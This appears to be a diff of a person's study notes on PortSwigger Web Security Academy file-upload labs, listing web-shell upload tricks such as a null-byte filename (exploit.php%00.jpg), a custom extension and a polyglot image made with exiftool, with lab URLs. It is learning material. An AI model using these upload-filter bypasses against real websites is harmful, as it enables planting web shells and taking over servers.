@@ -1037,7 +1037,8 @@ Update: python sqlmap.py --update
      Response: The file avatars/exploit.l33t has been uploaded.   
    - Browse: https://0aad0062048b502c8543289b001c008d.web-security-academy.net/files/avatars/exploit.l33t
 5. Web shell upload via **obfuscated file extension**
-   - Content-Disposition: form-data; name="avatar"; filename="**exploit.php%00.jpg**"   
+   - Content-Disposition: form-data; name="avatar"; filename="**exploit.php%00.jpg**"  
+   - Browse: https://0afd004d048cd486abbce56c0078005f.web-security-academy.net/files/avatars/exploit.php  
 6. Remote code execution via polyglot **web shell upload**
    - Install [exiftool](https://exiftool.org/install.html)   
      Add system environment variables path -> C:\exiftool-12.89_32  > rename to "exiftool.exe" > add a profile.png image into the folder
